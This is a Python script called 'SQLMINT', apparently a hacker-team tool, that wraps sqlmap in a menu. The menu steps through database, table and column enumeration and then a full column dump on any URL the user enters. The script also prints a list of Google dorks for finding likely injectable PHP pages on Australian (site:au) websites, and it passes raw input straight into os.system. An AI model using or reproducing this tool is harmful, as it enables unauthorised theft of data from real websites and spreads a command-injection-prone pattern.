#!/usr/bin/python3
# color
m="\033[1;31m"
p="\033[1;37m"
u="\033[1;35m"
k="\033[1;33m"
h="\033[1;32m"
b="\033[1;34m"

import sys,os,time

def sqlrun(s):
 for c in s + "\n":
     sys.stdout.write(c)
     sys.stdout.flush()
     time.sleep(0.1/99)

def keluar():
	print(m+"[!] "+p+"Exit program")
	os.system("xdg-open https://instagram.com/cyber_force017")
	os.system("xdg-open https://instagram.com/laskarfreeze")
	exit()

def benci():
	sqlrun(dork)

dork = ("""
\033[1;33m* \033[1;37mDORK BY \033[1;37mINDO\033[1;37mNESIAN ERROR SYSTEM \033[1;33m*
\033[1;32m-----------------------------------
inurl:detail.php?ID= site:au inurl:preview.php?id= site:au
inurl:pages.php?id= site:au
inurl:download.php?id= site:au inurl:read.php?id= site:au
inurl:news.php?id= site:au
inurl:newsDetail.php?id= site:au inurl:Pageid= site:au
inurl:show.php?id= site:au inurl:gallery.php?
id= site:au inurl:product.php?id= site:au inurl:viewphoto.php?id= site:au
inurl:material.php?id=
site:au newsDetail.php?id= site:au pages.php?id= site:au
view.php?id= site:au
theme.php?id= site:au
channel_id= site:au
newscat.php?id= site:au main.php?id= site:au
""")

def ulang():
	ulang=input("\033[4mwant to try again [Y/n] >\033[00m\033[1;33m ")
	if ulang == "Y" or ulang == "y":
	   runsql()
	elif ulang == "N" or ulang == "n":
	   exit()

def info():
	print("""\033[1;37m
Tools ini membutuh sqlmap untuk menjalankan
bagi kalian yang belum install sqlmap silakan install
terlebih dahulu
ketikkan python3 install.py
""")

def runsql():
	seturl()
	setdate()
	setable()
	setdump()
	ulang()
def seturl():
	url=input("\033[4m\033[1;37murl >\033[00m\033[1;32m ")
	os.system("cd sqlmap;python sqlmap.py -u "+url+" --dbs")
def setdate():
	url=input("\033[4m\033[1;37murl >\033[00m\033[1;32m ")
	date=input("\033[4m\033[1;37mdatabase >\033[00m\033[1;32m ")
	os.system("cd sqlmap;python sqlmap.py -u "+url+" -D "+date+" --tables")
def setable():
	url=input("\033[4m\033[1;37murl >\033[00m\033[1;32m ")
	date=input("\033[4m\033[1;37mdatabase >\033[00m\033[1;32m ")
	tables=input("\033[4m\033[1;37mtables >\033[00m\033[1;32m ")
	os.system("cd sqlmap;python sqlmap.py -u "+url+" -D "+date+" -T "+tables+" --columns")
def setdump():
	url=input("\033[4m\033[1;37murl >\033[00m\033[1;32m ")
	date=input("\033[4m\033[1;37mdatabase >\033[00m\033[1;32m ")
	tables=input("\033[4m\033[1;37mtables >\033[00m\033[1;32m ")
	dump=input("\033[4m\033[1;37mdump >\033[00m\033[1;32m ")
	os.system("cd sqlmap;python sqlmap.py -u "+url+" -D "+date+" -T "+tables+" -C "+dump+" --dump")

def banner():
	os.system("clear")
	print("")
	print(p+"                   [ "+m+"SQLMINT "+p+"] "+k+"v1.0")
	print(p+"           Author: Aslan017 X laskarfreeze")
	print(p+"               Team: "+m+"Indo"+p+"nesian Necoder")
	print(h+"--------------------------------------------------")

def menu():
	banner()
	print("")
	print(b+"{"+h+"1"+b+"} "+p+"Run sqlmint")
	print(b+"{"+h+"2"+b+"} "+p+"Info use sqlmint")
	print(b+"{"+h+"3"+b+"} "+p+"Live dork sql")
	print(b+"{"+h+"0"+b+"} "+p+"Exit Program")
	print("")	
	sql=input("\033[3m\033[4m\033[1;37msqlmint >\033[00m\033[1;32m ")
	if sql == "1":
	   runsql()
	elif sql == "2":
	   info()
	elif sql == "3":
	   benci()
	elif sql == "0":
	   keluar()
	else:
		 print(m+"[-] Number not found : "+p+""+sql)
		 time.sleep(2)
		 menu()
try:
	menu()
except KeyboardInterrupt:
	exit()

